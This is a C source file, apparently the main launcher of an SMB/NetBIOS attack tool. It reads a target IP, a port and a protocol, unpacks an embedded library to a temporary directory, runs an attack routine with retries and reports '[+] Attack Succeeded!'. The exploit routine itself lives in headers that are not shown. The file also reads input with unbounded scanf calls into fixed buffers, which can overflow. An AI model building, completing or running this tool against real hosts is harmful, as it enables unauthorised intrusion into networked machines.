#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <conio.h>

#include "global.h"
#include "attack.h"
#include "enc_res/dep_lib.h"
#include "utils/ex_string.h"

#define RETRY_COUNT 3

int main(int args, char *argv[])
{
    TARGET_DESC targetDesc;
    char rootDir[MAX_PATH];

    memset(&targetDesc, 0x00, sizeof(targetDesc));
    memset(rootDir, 0x00, sizeof(rootDir));

    if(args == 4)
    {
        if(strlen(argv[1]) >= sizeof(targetDesc.ip) || \
           strlen(argv[2]) > 5 || strlen(argv[3]) != 3)
        {
            printf("Incorrect parameter input.");
            return -2;
        }
        strcat(targetDesc.ip, argv[1]);
        strcat(targetDesc.port, argv[2]);
        strcat(targetDesc.proto, upper_str(argv[3]));
        if(strcmp(targetDesc.proto, "SMB") !=0 && \
           strcmp(targetDesc.proto, "NBT") != 0)
        {
            printf("[-] Invalid protocol type.\n");
            return -1;
        }
    }
    else
    {
        printf("[?] Target IP: ");
        scanf("%s", targetDesc.ip);
        printf("[?] Target Port: ");
        scanf("%s", targetDesc.port);
        printf("[?] Protocol[SMB/NBT]: ");
        scanf("%s", targetDesc.proto);
        memcpy(targetDesc.proto, upper_str(targetDesc.proto), \
               strlen(targetDesc.proto));
        if(strcmp(targetDesc.proto, "SMB") !=0 && \
           strcmp(targetDesc.proto, "NBT") != 0)
        {
            printf("[-] Invalid protocol type.\n");
            return -1;
        }
    }

    if(extract_lib(TEMP_EXTRACT_DIR) != 0)
    {
        return -1;
    }
    strcat(rootDir, getcwd(NULL, NULL));
    chdir(TEMP_EXTRACT_DIR);
    printf("[+] Current working directory: %s\n", getcwd(NULL, NULL));

    if(attack_target(&targetDesc, RETRY_COUNT) == 0)
    {
        printf("[+] Attack Succeeded!\n");
    }
    else
    {
        printf("[-] Attack Failed!\n");
    }
    chdir(rootDir);
    remove(TEMP_EXTRACT_DIR);
    getch();

    return 0;
}
